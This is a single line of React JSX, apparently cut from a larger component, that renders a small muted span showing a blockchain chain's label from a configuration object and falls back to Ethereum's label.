                                   <span className="muted" style={{ fontSize: '0.75rem' }}>{chainConfig[r.chain]?.label ?? chainConfig.ethereum.label}</span>
